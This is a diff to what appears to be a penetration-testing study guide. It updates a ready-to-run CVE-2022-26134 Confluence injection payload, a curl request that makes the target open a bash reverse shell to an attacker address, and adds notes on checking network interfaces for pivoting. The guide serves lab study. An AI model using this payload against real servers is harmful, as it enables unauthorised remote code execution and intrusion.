@@ -362,7 +362,7 @@ Look for service versions (exploit-db), abusing file-upload vulnerability, user 
 It's important to at least psyeudo understand the payload that you are using, if nothing else, to make sure that it works on your end. For example, CVE-2022-26134 for Confluence uses the following payload:
 
 ```bash
-curl -v http://192.168.219.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.232/1270%200%3E%261%27%29.start%28%29%22%29%7D/
+curl -v http://192.168.235.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.213/1271%200%3E%261%27%29.start%28%29%22%29%7D/
 ```
 
 If you didn't study the payload, you wouldn't see the there are certain characters in the payload that *aren't* url endcoded. These characters are like this for a reason. You can extrapolate to many other payloads. 
@@ -373,3 +373,24 @@ If you didn't study the payload, you wouldn't see the there are certain characte
 sudo lsof -i :2345
 kill -9 <PID>
 ```
+
+#### Is the Computer Connected to Other Internal Computers?
+
+When looking at the output from ifconfig, ipconfig, or ip addr, see if there is more than one network interface (other than the loopback). If there is, that is very interesting, and you should enumerate, if not, just focus on the computer itself. The computer below is not connected to other internal networks.
+
+```bash
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:50:56:8a:26:5d brd ff:ff:ff:ff:ff:ff
+    altname enp11s0
+    inet 192.168.50.244/24 brd 192.168.50.255 scope global ens192
+       valid_lft forever preferred_lft forever
+    inet6 fe80::250:56ff:fe8a:265d/64 scope link 
+       valid_lft forever preferred_lft forever
+```
+
